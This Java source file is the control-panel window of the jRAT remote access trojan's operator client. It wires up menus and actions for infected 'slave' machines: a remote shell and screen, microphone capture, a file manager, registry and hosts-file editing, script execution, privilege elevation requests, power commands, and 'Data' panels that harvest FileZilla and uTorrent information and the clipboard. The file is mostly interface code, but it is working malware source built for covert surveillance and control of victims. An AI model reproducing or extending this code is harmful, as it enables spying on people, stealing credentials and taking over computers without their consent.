package se.jrat.client.ui.frames;

import java.awt.BorderLayout;
import java.awt.Toolkit;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import javax.swing.GroupLayout;
import javax.swing.GroupLayout.Alignment;
import javax.swing.ImageIcon;
import javax.swing.JCheckBoxMenuItem;
import javax.swing.JFrame;
import javax.swing.JMenu;
import javax.swing.JMenuBar;
import javax.swing.JMenuItem;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTabbedPane;
import javax.swing.JTree;
import javax.swing.LayoutStyle.ComponentPlacement;
import javax.swing.ScrollPaneConstants;
import javax.swing.border.EmptyBorder;
import javax.swing.event.TreeSelectionEvent;
import javax.swing.event.TreeSelectionListener;
import javax.swing.tree.DefaultMutableTreeNode;
import javax.swing.tree.DefaultTreeModel;

import jrat.api.BaseControlPanel;
import jrat.api.RATControlMenuEntry;
import se.jrat.client.Constants;
import se.jrat.client.Script;
import se.jrat.client.Slave;
import se.jrat.client.addons.Plugin;
import se.jrat.client.addons.PluginLoader;
import se.jrat.client.addons.RATObjectFormat;
import se.jrat.client.exceptions.ControlPanelLoadException;
import se.jrat.client.listeners.Performable;
import se.jrat.client.packets.outgoing.Packet100RequestElevation;
import se.jrat.client.packets.outgoing.Packet11Disconnect;
import se.jrat.client.packets.outgoing.Packet28ShutdownComputer;
import se.jrat.client.packets.outgoing.Packet29RestartComputer;
import se.jrat.client.packets.outgoing.Packet30LogoutComputer;
import se.jrat.client.packets.outgoing.Packet31ComputerSleep;
import se.jrat.client.packets.outgoing.Packet32LockComputer;
import se.jrat.client.packets.outgoing.Packet37RestartJavaProcess;
import se.jrat.client.packets.outgoing.Packet45Reconnect;
import se.jrat.client.ui.components.tree.DisabledDefaultMutableTreeNode;
import se.jrat.client.ui.dialogs.DialogRemoteSoundCapture;
import se.jrat.client.ui.panels.PanelControlActivePorts;
import se.jrat.client.ui.panels.PanelControlAdapters;
import se.jrat.client.ui.panels.PanelControlClipboard;
import se.jrat.client.ui.panels.PanelControlComputerInfo;
import se.jrat.client.ui.panels.PanelControlConfig;
import se.jrat.client.ui.panels.PanelControlDownloadManager;
import se.jrat.client.ui.panels.PanelControlDrives;
import se.jrat.client.ui.panels.PanelControlErrorLog;
import se.jrat.client.ui.panels.PanelControlFileZilla;
import se.jrat.client.ui.panels.PanelControlFunManager;
import se.jrat.client.ui.panels.PanelControlHostsFile;
import se.jrat.client.ui.panels.PanelControlInstalledPrograms;
import se.jrat.client.ui.panels.PanelControlJVMProperties;
import se.jrat.client.ui.panels.PanelControlLANScan;
import se.jrat.client.ui.panels.PanelControlLoadedPlugins;
import se.jrat.client.ui.panels.PanelControlLocales;
import se.jrat.client.ui.panels.PanelControlMessagebox;
import se.jrat.client.ui.panels.PanelControlMonitors;
import se.jrat.client.ui.panels.PanelControlNetGateway;
import se.jrat.client.ui.panels.PanelControlParent;
import se.jrat.client.ui.panels.PanelControlPerformance;
import se.jrat.client.ui.panels.PanelControlPiano;
import se.jrat.client.ui.panels.PanelControlPrinter;
import se.jrat.client.ui.panels.PanelControlRegStart;
import se.jrat.client.ui.panels.PanelControlRemoteProcess;
import se.jrat.client.ui.panels.PanelControlScript;
import se.jrat.client.ui.panels.PanelControlSearch;
import se.jrat.client.ui.panels.PanelControlServices;
import se.jrat.client.ui.panels.PanelControlSpeech;
import se.jrat.client.ui.panels.PanelControlTrace;
import se.jrat.client.ui.panels.PanelControluTorrentDownloads;
import se.jrat.client.ui.renderers.ControlPanelTreeRenderer;
import se.jrat.client.utils.FlagUtils;
import se.jrat.client.utils.IconUtils;
import se.jrat.client.utils.Utils;

import com.redpois0n.oslib.OperatingSystem;

@SuppressWarnings({ "serial" })
public class FrameControlPanel extends BaseFrame {

	public Slave slave;

	private JPanel contentPane;
	private JPanel panel;
	private JTree tree;

	public static final Map<Slave, FrameControlPanel> instances = new HashMap<Slave, FrameControlPanel>();
	public static final List<RATControlMenuEntry> entries = new ArrayList<RATControlMenuEntry>();

	public HashMap<String, JPanel> panels = new HashMap<String, JPanel>();
	public HashMap<String, Performable> actions = new HashMap<String, Performable>();
	private JTabbedPane tabbedPane;
	private JMenuBar menuBar;
	private JMenu mnActions;
	private JMenuItem mntmCollapseAll;
	private JMenuItem mntmExpandAll;
	private JCheckBoxMenuItem chckbxmntmRootVisible;

	public JTabbedPane getTabbedPane() {
		return tabbedPane;
	}

	public JTree getTree() {
		return tree;
	}

	public void loadItems() {
		if (entries.size() == 0) {
			for (Plugin p : PluginLoader.plugins) {
				for (RATControlMenuEntry entry : p.getControlItems()) {
					entries.add(entry);
				}
			}
		}
	}

	public FrameControlPanel(final Slave slave) {
		super();
		loadItems();
		super.addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				for (RATControlMenuEntry entry : entries) {
					try {
						BaseControlPanel panel = entry.instances.get(slave.getIP());
						
						if (panel != null) {
							panel.onClose();
						}
						
						entry.instances.remove(slave.getIP());
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		});
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameControlPanel.class.getResource("/icons/controlpanel.png")));
		setTitle("Control Panel - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
		this.slave = slave;
		final Slave sl = slave;
		instances.put(slave, this);

		setResizable(false);
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 807, 414);
		contentPane = new JPanel();
		contentPane.setBorder(new EmptyBorder(5, 5, 5, 5));
		setContentPane(contentPane);

		panel = new JPanel();
		panel.setSize(600, 350);

		JScrollPane scrollPane = new JScrollPane();
		scrollPane.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
		GroupLayout gl_contentPane = new GroupLayout(contentPane);
		gl_contentPane.setHorizontalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 175, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.RELATED).addComponent(panel, GroupLayout.PREFERRED_SIZE, 607, GroupLayout.PREFERRED_SIZE).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addGroup(gl_contentPane.createParallelGroup(Alignment.TRAILING, false).addComponent(scrollPane, Alignment.LEADING).addComponent(panel, Alignment.LEADING, GroupLayout.DEFAULT_SIZE, 364, Short.MAX_VALUE)).addContainerGap(12, Short.MAX_VALUE)));

		tree = new JTree();
		tree.setShowsRootHandles(true);
		tree.addTreeSelectionListener(new TreeSelectionListener() {
			public void valueChanged(TreeSelectionEvent e) {
				try {
					checkUp(e.getPath().getPath()[1].toString().toLowerCase());
					String what = e.getPath().getPath()[2].toString().toLowerCase();
					
					boolean disabled = e.getPath().getLastPathComponent() instanceof DisabledDefaultMutableTreeNode;
					
					if (!actions.containsKey(what) && !disabled) {
						JPanel p = panels.get(what);
						tabbedPane.setSelectedComponent(p);
					} else if (!disabled) {
						Performable listener = actions.get(what);
						listener.perform();
					}
				} catch (Exception ex) {

				}
			}
		});
		tree.setRootVisible(false);
		tree.setCellRenderer(getRenderer());
		tree.setModel(new DefaultTreeModel(new DefaultMutableTreeNode("Control Panel") {
			{
				addNodes(this);
			}
		}));
		scrollPane.setViewportView(tree);
		contentPane.setLayout(gl_contentPane);

		expandAll(tree);

		menuBar = new JMenuBar();
		scrollPane.setColumnHeaderView(menuBar);

		mnActions = new JMenu("Actions");
		menuBar.add(mnActions);

		mntmCollapseAll = new JMenuItem("Collapse all");
		mntmCollapseAll.setIcon(IconUtils.getIcon("collapse"));
		mntmCollapseAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				collapseAll(tree);
			}
		});
		mnActions.add(mntmCollapseAll);

		mntmExpandAll = new JMenuItem("Expand all");
		mntmExpandAll.setIcon(IconUtils.getIcon("expand"));
		mntmExpandAll.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				expandAll(tree);
			}
		});
		mnActions.add(mntmExpandAll);

		chckbxmntmRootVisible = new JCheckBoxMenuItem("Root visible");
		chckbxmntmRootVisible.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				tree.setRootVisible(chckbxmntmRootVisible.isSelected());
			}
		});
		mnActions.add(chckbxmntmRootVisible);

		mnActions.addSeparator();

		JMenuItem mntmReload = new JMenuItem("Reload");
		mntmReload.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent arg0) {
				setVisible(false);
				dispose();
				new FrameControlPanel(sl).setVisible(true);
			}
		});
		mntmReload.setIcon(IconUtils.getIcon("refresh"));
		mnActions.add(mntmReload);

		JMenuItem mntmClose = new JMenuItem("Close");
		mntmClose.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				setVisible(false);
				dispose();
			}
		});
		mntmClose.setIcon(IconUtils.getIcon("delete"));
		mnActions.add(mntmClose);
		addPanels();
		addActions();

		panel.setLayout(new BorderLayout(0, 0));

		tabbedPane = new JTabbedPane(JTabbedPane.TOP);
		panel.add(tabbedPane, BorderLayout.CENTER);

		checkUp("system info");
	}

	public ControlPanelTreeRenderer getRenderer() {
		final ControlPanelTreeRenderer r = new ControlPanelTreeRenderer();
		new Thread(new Runnable() {
			public void run() {
				r.icons.put("control panel", IconUtils.getIcon("controlpanel"));
				r.icons.put("system info", IconUtils.getIcon("info"));
				r.icons.put("computer info", IconUtils.getIcon("computer"));
				r.icons.put("system monitor", IconUtils.getIcon("meter"));
				r.icons.put("fun manager", IconUtils.getIcon("smiley"));
				r.icons.put("fun", IconUtils.getIcon("fun"));
				r.icons.put("messagebox", IconUtils.getIcon("messagebox"));
				r.icons.put("remote chat", IconUtils.getIcon("chat"));
				r.icons.put("remote shell", IconUtils.getIcon("terminal"));
				r.icons.put("remote process", IconUtils.getIcon("process-go"));
				r.icons.put("system functions", IconUtils.getIcon("system"));
				r.icons.put("spy functions", IconUtils.getIcon("fingerprint"));
				r.icons.put("remote screen", IconUtils.getIcon("screen"));
				r.icons.put("html", Script.getIcon(Script.HTML));
				r.icons.put("java", Script.getIcon(Script.JS));
				r.icons.put("batch", Script.getIcon(Script.BAT));
				r.icons.put("vb script", Script.getIcon(Script.VB));
				r.icons.put("shell script", Script.getIcon(Script.SH));
				r.icons.put("scripting", IconUtils.getIcon("scripting"));
				r.icons.put("file system", IconUtils.getIcon("folder-tree"));
				r.icons.put("file searcher", IconUtils.getIcon("folder-search"));
				r.icons.put("file manager", IconUtils.getIcon("folder-go"));
				r.icons.put("hosts file", IconUtils.getIcon("computer"));
				r.icons.put("utorrent downloads", IconUtils.getIcon("utorrent"));
				r.icons.put("data", IconUtils.getIcon("coins"));
				r.icons.put("download manager", IconUtils.getIcon("arrow-down"));
				r.icons.put("network functions", IconUtils.getIcon("firewall"));
				r.icons.put("computer power", IconUtils.getIcon("battery"));
				r.icons.put("shutdown", IconUtils.getIcon("shutdown"));
				r.icons.put("restart", IconUtils.getIcon("restart"));
				r.icons.put("logout", IconUtils.getIcon("logout"));
				r.icons.put("sleep mode", IconUtils.getIcon("sleepmode"));
				r.icons.put("lock", IconUtils.getIcon("lock"));
				r.icons.put("clipboard", IconUtils.getIcon("clipboard"));
				r.icons.put("connection actions", IconUtils.getIcon("toolbox"));
				r.icons.put("reconnect", IconUtils.getIcon("refresh-blue"));
				r.icons.put("disconnect", IconUtils.getIcon("delete"));
				r.icons.put("restart connection", IconUtils.getIcon("refresh"));
				r.icons.put("uninstall", IconUtils.getIcon("exit"));
				r.icons.put("system properties", IconUtils.getIcon("properties"));
				r.icons.put("environment variables", IconUtils.getIcon("categories"));
				r.icons.put("jvm info", IconUtils.getIcon("java"));
				r.icons.put("piano", IconUtils.getIcon("piano"));
				r.icons.put("filezilla", IconUtils.getIcon("filezilla"));
				r.icons.put("printer", IconUtils.getIcon("printer"));
				r.icons.put("misc", IconUtils.getIcon("other"));
				r.icons.put("lan computers", IconUtils.getIcon("firewall"));
				r.icons.put("net gateway", IconUtils.getIcon("router"));
				r.icons.put("active ports", IconUtils.getIcon("ports"));
				r.icons.put("speech", IconUtils.getIcon("speech"));
				r.icons.put("trace", IconUtils.getIcon("location"));
				r.icons.put("windows services", IconUtils.getIcon("block"));
				r.icons.put("remote msconfig", IconUtils.getIcon("service-go"));
				r.icons.put("registry startup", IconUtils.getIcon("toolbox"));
				r.icons.put("registry", IconUtils.getIcon("registry"));
				r.icons.put("installed programs", IconUtils.getIcon("package"));
				r.icons.put("network adapters", IconUtils.getIcon("cpu"));
				r.icons.put("sound capture", IconUtils.getIcon("microphone"));
				r.icons.put("no plugins available", IconUtils.getIcon("plugin-warning"));
				r.icons.put("plugins", IconUtils.getIcon("plugin"));
				r.icons.put("drives", IconUtils.getIcon("drives"));
				r.icons.put("monitors", IconUtils.getIcon("monitor-network"));
				r.icons.put("error log", IconUtils.getIcon("error"));
				r.icons.put("config", IconUtils.getIcon("tab-settings"));
				r.icons.put("view installed plugins", IconUtils.getIcon("plugin-go"));
				r.icons.put("notes", IconUtils.getIcon("notes"));
				r.icons.put("locales", FlagUtils.getFlag(slave));
				r.icons.put("request elevation", IconUtils.getIcon("shield"));

				ImageIcon plugin = IconUtils.getIcon("plugin");

				for (RATControlMenuEntry entry : entries) {
					if (entry.getIcon() != null) {
						r.icons.put(entry.getName().toLowerCase(), entry.getIcon());
					} else {
						r.icons.put(entry.getName().toLowerCase(), plugin);
					}
				}
				getTree().repaint();
			}
		}).start();

		return r;
	}

	public void checkUp(String str) {
		Map<String, ImageIcon> i = ((ControlPanelTreeRenderer) tree.getCellRenderer()).icons;

		if (str.equals("system info")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Computer Info", i.get("computer info"), panels.get("computer info"));
			tabbedPane.addTab("System Info", i.get("system monitor"), panels.get("system monitor"));
			tabbedPane.addTab("Locales", i.get("locales"), panels.get("locales"));
			tabbedPane.addTab("Drives", i.get("drives"), panels.get("drives"));
			tabbedPane.addTab("Monitors", i.get("monitors"), panels.get("monitors"));
			tabbedPane.addTab("JVM Info", i.get("jvm info"), panels.get("jvm info"));
			tabbedPane.addTab("Config", i.get("config"), panels.get("config"));
			tabbedPane.addTab("Trace", i.get("trace"), panels.get("trace"));
		} else if (str.equals("fun")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Fun Manager", i.get("fun manager"), panels.get("fun manager"));
			tabbedPane.addTab("Piano", i.get("piano"), panels.get("piano"));
			tabbedPane.addTab("Messagebox", i.get("messagebox"), panels.get("messagebox"));
			tabbedPane.addTab("Speech", i.get("speech"), panels.get("speech"));
		} else if (str.equals("system functions")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Remote Process", i.get("remote process"), panels.get("remote process"));
			tabbedPane.addTab("Hosts File", i.get("hosts file"), panels.get("hosts file"));
			tabbedPane.addTab("Installed Programs", i.get("installed programs"), panels.get("installed programs"));
		} else if (str.equals("scripting")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("HTML", i.get("html"), panels.get("html"));
			tabbedPane.addTab("Batch", i.get("batch"), panels.get("batch"));
			tabbedPane.addTab("JavaScript", i.get("java"), panels.get("java"));
			tabbedPane.addTab("VB Script", i.get("vb script"), panels.get("vb script"));
			tabbedPane.addTab("Shell Script", i.get("shell script"), panels.get("shell script"));
		} else if (str.equals("file system")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("File Searcher", i.get("file searcher"), panels.get("file searcher"));
		} else if (str.equals("data")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("uTorrent Downloads", i.get("utorrent downloads"), panels.get("utorrent downloads"));
			tabbedPane.addTab("FileZilla", i.get("filezilla"), panels.get("filezilla"));
			tabbedPane.addTab("Clipboard", i.get("clipboard"), panels.get("clipboard"));
		} else if (str.equals("network functions")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Download manager", i.get("download manager"), panels.get("download manager"));
			tabbedPane.addTab("LAN Computers", i.get("lan computers"), panels.get("lan computers"));
			tabbedPane.addTab("Net Gateway", i.get("net gateway"), panels.get("net gateway"));
			tabbedPane.addTab("Active Ports", i.get("active ports"), panels.get("active ports"));
			tabbedPane.addTab("Network Adapters", i.get("network adapters"), panels.get("network adapters"));
		} else if (str.equals("misc")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Printer", i.get("printer"), panels.get("printer"));
			tabbedPane.addTab("Error Log", i.get("error log"), panels.get("error log"));
		} else if (str.equals("remote msconfig")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("Windows Services", i.get("windows services"), panels.get("windows services"));
			tabbedPane.addTab("Registry Startup", i.get("registry startup"), panels.get("registry startup"));
		} else if (str.equals("plugins")) {
			tabbedPane.removeAll();
			tabbedPane.addTab("View Installed Plugins", i.get("view installed plugins"), panels.get("view installed plugins"));

			ImageIcon def = i.get("plugins");
			for (RATControlMenuEntry entry : entries) {
				try {
					BaseControlPanel panel = entry.newPanelInstance(RATObjectFormat.format(slave));
					panel.onLoad();
					tabbedPane.addTab(entry.getName(), entry.getIcon() == null ? def : entry.getIcon(), panel);
					entry.instances.put(slave.getIP(), panel);
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		}
	}

	public void addNodes(DefaultMutableTreeNode n) {
		DefaultMutableTreeNode systeminfo = getTreeNode("System Info");
		n.add(systeminfo);

		systeminfo.add(getTreeNode("Computer Info"));
		systeminfo.add(getTreeNode("System Monitor"));
		systeminfo.add(getTreeNode("Locales"));
		systeminfo.add(getTreeNode("Environment Variables"));
		systeminfo.add(getTreeNode("System Properties"));
		systeminfo.add(getTreeNode("Drives"));
		systeminfo.add(getTreeNode("Monitors"));
		systeminfo.add(getTreeNode("JVM Info"));
		systeminfo.add(getTreeNode("Config"));
		systeminfo.add(getTreeNode("Trace"));

		DefaultMutableTreeNode fun = getTreeNode("Fun");
		n.add(fun);
		fun.add(getTreeNode("Fun Manager"));
		fun.add(getTreeNode("Piano"));
		fun.add(getTreeNode("Messagebox"));
		fun.add(getTreeNode("Remote Chat"));
		fun.add(getTreeNode("Speech"));

		DefaultMutableTreeNode systemfunctions = getTreeNode("System Functions");
		n.add(systemfunctions);
		systemfunctions.add(getTreeNode("Remote Shell"));
		systemfunctions.add(getTreeNode("Remote Process"));
		systemfunctions.add(getTreeNode("Hosts File"));
		systemfunctions.add(getTreeNode("Registry", slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS));
		systemfunctions.add(getTreeNode("Installed Programs", slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS || slave.getOperatingSystem().getType() == OperatingSystem.OSX));

		DefaultMutableTreeNode msconfig = getTreeNode("Remote MSConfig");
		n.add(msconfig);
		msconfig.add(getTreeNode("Windows Services", slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS));
		msconfig.add(getTreeNode("Registry Startup", slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS));

		DefaultMutableTreeNode spy = getTreeNode("Spy Functions");
		n.add(spy);
		spy.add(getTreeNode("Remote Screen"));
		spy.add(getTreeNode("Sound Capture"));

		DefaultMutableTreeNode scripting = getTreeNode("Scripting");
		n.add(scripting);
		scripting.add(getTreeNode("HTML"));
		scripting.add(getTreeNode("Batch"));
		scripting.add(getTreeNode("JavaScript"));
		scripting.add(getTreeNode("VB Script"));
		scripting.add(getTreeNode("Shell Script"));

		DefaultMutableTreeNode filesystem = getTreeNode("File System");
		n.add(filesystem);
		filesystem.add(getTreeNode("File Manager"));
		filesystem.add(getTreeNode("File Searcher"));

		DefaultMutableTreeNode stealersdata = getTreeNode("Data");
		n.add(stealersdata);
		stealersdata.add(getTreeNode("uTorrent downloads"));
		stealersdata.add(getTreeNode("FileZilla"));
		stealersdata.add(getTreeNode("Clipboard"));

		DefaultMutableTreeNode network = getTreeNode("Network functions");
		n.add(network);
		network.add(getTreeNode("Download Manager"));
		network.add(getTreeNode("LAN Computers", slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS));
		network.add(getTreeNode("Net Gateway"));
		network.add(getTreeNode("Active Ports", slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS));
		network.add(getTreeNode("Network Adapters", slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS));

		DefaultMutableTreeNode power = getTreeNode("Computer power");
		n.add(power);
		power.add(getTreeNode("Shutdown"));
		power.add(getTreeNode("Restart"));
		power.add(getTreeNode("Sleep Mode", slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS));
		power.add(getTreeNode("Lock", slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS));
		power.add(getTreeNode("Logout", slave.getOperatingSystem().getType() == OperatingSystem.WINDOWS));

		DefaultMutableTreeNode misc = getTreeNode("Misc");
		n.add(misc);
		misc.add(getTreeNode("Printer"));
		misc.add(getTreeNode("Traffic"));
		misc.add(getTreeNode("Error Log"));
		misc.add(getTreeNode("Notes"));
	
		DefaultMutableTreeNode plugins = getTreeNode("Plugins");
		n.add(plugins);
		plugins.add(getTreeNode("View Installed Plugins"));
		if (entries.size() == 0) {
			plugins.add(getTreeNode("No plugins available"));
		} else {
			for (RATControlMenuEntry entry : entries) {
				plugins.add(getTreeNode(entry.getName()));
			}
		}

		DefaultMutableTreeNode slave = getTreeNode("Connection Actions");
		n.add(slave);
		slave.add(getTreeNode("Request Elevation"));
		slave.add(getTreeNode("Restart connection"));
		slave.add(getTreeNode("Reconnect"));
		slave.add(getTreeNode("Disconnect"));
		slave.add(getTreeNode("Uninstall"));
	}

	public void addPanels() {
		panels.clear();
		try {
			addPanel("computer info", new PanelControlComputerInfo(slave));
			addPanel("system monitor", new PanelControlPerformance(slave));
			addPanel("fun manager", new PanelControlFunManager(slave));
			addPanel("messagebox", new PanelControlMessagebox(slave));
			addPanel("remote process", new PanelControlRemoteProcess(slave));
			addPanel("html", new PanelControlScript(slave, Script.HTML));
			addPanel("vb script", new PanelControlScript(slave, Script.VB));
			addPanel("batch", new PanelControlScript(slave, Script.BAT));
			addPanel("javascript", new PanelControlScript(slave, Script.JS));
			addPanel("shell script", new PanelControlScript(slave, Script.SH));
			addPanel("file searcher", new PanelControlSearch(slave));
			addPanel("hosts file", new PanelControlHostsFile(slave));
			addPanel("utorrent downloads", new PanelControluTorrentDownloads(slave));
			addPanel("download manager", new PanelControlDownloadManager(slave));
			addPanel("clipboard", new PanelControlClipboard(slave));
			addPanel("jvm info", new PanelControlJVMProperties(slave));
			addPanel("piano", new PanelControlPiano(slave));
			addPanel("filezilla", new PanelControlFileZilla(slave));
			addPanel("printer", new PanelControlPrinter(slave));
			addPanel("lan computers", new PanelControlLANScan(slave));
			addPanel("net gateway", new PanelControlNetGateway(slave));
			addPanel("active ports", new PanelControlActivePorts(slave));
			addPanel("speech", new PanelControlSpeech(slave));
			addPanel("windows services", new PanelControlServices(slave));
			addPanel("registry startup", new PanelControlRegStart(slave));
			addPanel("installed programs", new PanelControlInstalledPrograms(slave));
			addPanel("network adapters", new PanelControlAdapters(slave));
			addPanel("drives", new PanelControlDrives(slave));
			addPanel("monitors", new PanelControlMonitors(slave));
			addPanel("error log", new PanelControlErrorLog(slave));
			addPanel("config", new PanelControlConfig(slave));
			addPanel("view installed plugins", new PanelControlLoadedPlugins(slave));
			addPanel("locales", new PanelControlLocales(slave));
			addPanel("trace", new PanelControlTrace(slave));
		} catch (Exception ex) {
			ControlPanelLoadException cple = new ControlPanelLoadException("Failed to load a panel", ex);
			cple.printStackTrace();
		}
	}

	public void addPanel(String name, PanelControlParent panel) {
		panels.put(name, panel);
	}

	public void addActions() {
		actions.clear();

		actions.put("sound capture", new Performable() {
			public void perform() {
				DialogRemoteSoundCapture f = new DialogRemoteSoundCapture(slave);
				f.setVisible(true);
			}
		});

		actions.put("remote shell", new Performable() {
			public void perform() {
				FrameRemoteShell frame = new FrameRemoteShell(slave);
				frame.setVisible(true);
			}
		});

		actions.put("remote chat", new Performable() {
			@Override
			public void perform() {
				FrameRemoteChat frame = new FrameRemoteChat(slave);
				frame.setVisible(true);
			}
		});

		actions.put("remote screen", new Performable() {
			@Override
			public void perform() {
				FrameRemoteScreen frame = new FrameRemoteScreen(slave);
				frame.setVisible(true);
			}
		});

		actions.put("file manager", new Performable() {
			public void perform() {
				FrameRemoteFiles frame = new FrameRemoteFiles(slave);
				frame.setVisible(true);
			}
		});

		actions.put("shutdown", new Performable() {
			public void perform() {
				if (Utils.yesNo("Confirm", "Are you sure you want to shutdown this computer?")) {
					slave.addToSendQueue(new Packet28ShutdownComputer());
				}
			}
		});

		actions.put("restart", new Performable() {
			public void perform() {
				if (Utils.yesNo("Confirm", "Are you sure you want to restart this computer?")) {
					slave.addToSendQueue(new Packet29RestartComputer());
				}
			}
		});

		actions.put("sleep mode", new Performable() {
			public void perform() {
				if (Utils.yesNo("Confirm", "Are you sure you want to put this computer in sleep mode?")) {
					slave.addToSendQueue(new Packet31ComputerSleep());
				}
			}
		});

		actions.put("lock", new Performable() {
			public void perform() {
				if (Utils.yesNo("Confirm", "Are you sure you want to lock this computer?")) {
					slave.addToSendQueue(new Packet32LockComputer());
				}
			}
		});

		actions.put("logout", new Performable() {
			public void perform() {
				if (Utils.yesNo("Confirm", "Are you sure you want to logout this computer?")) {
					slave.addToSendQueue(new Packet30LogoutComputer());
				}
			}
		});

		actions.put("restart connection", new Performable() {
			public void perform() {
				try {
					slave.addToSendQueue(new Packet37RestartJavaProcess());
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		});

		actions.put("reconnect", new Performable() {
			public void perform() {
				try {
					slave.addToSendQueue(new Packet45Reconnect());
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		});

		actions.put("disconnect", new Performable() {
			public void perform() {
				try {
					slave.addToSendQueue(new Packet11Disconnect());
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		});

		actions.put("uninstall", new Performable() {
			public void perform() {
				if (Utils.yesNo("Confirm", "Confirm uninstalling this connection?")) {
					try {
						slave.addToSendQueue(new Packet11Disconnect());
					} catch (Exception ex) {
						ex.printStackTrace();
					}
				}
			}
		});

		actions.put("system properties", new Performable() {
			public void perform() {
				FrameSystem frame = new FrameSystem(Constants.MODE_PROP, slave);
				frame.setVisible(true);
			}
		});

		actions.put("environment variables", new Performable() {
			public void perform() {
				FrameSystem frame = new FrameSystem(Constants.MODE_ENV, slave);
				frame.setVisible(true);
			}
		});

		actions.put("registry", new Performable() {
			public void perform() {
				FrameRemoteRegistry frame = new FrameRemoteRegistry(slave);
				frame.setVisible(true);
			}
		});

		actions.put("notes", new Performable() {
			public void perform() {
				FrameNotes frame = new FrameNotes(slave);
				frame.setVisible(true);
			}
		});

		actions.put("request elevation", new Performable() {
			public void perform() {
				slave.addToSendQueue(new Packet100RequestElevation());
			}
		});
	}

	public void expandAll(JTree tree) {
		for (int i = 0; i < tree.getRowCount(); i++) {
			tree.expandRow(i);
		}
	}

	public void collapseAll(JTree tree) {
		for (int i = 0; i < tree.getRowCount(); i++) {
			tree.collapseRow(i);
		}
	}
	
	public DefaultMutableTreeNode getTreeNode(String s) {
		return getTreeNode(s, true);
	}
	
	public DefaultMutableTreeNode getTreeNode(String s, boolean enabled) {
		if (enabled) {
			return new DefaultMutableTreeNode(s);
		} else {
			return new DisabledDefaultMutableTreeNode(s);
		}
	}
}
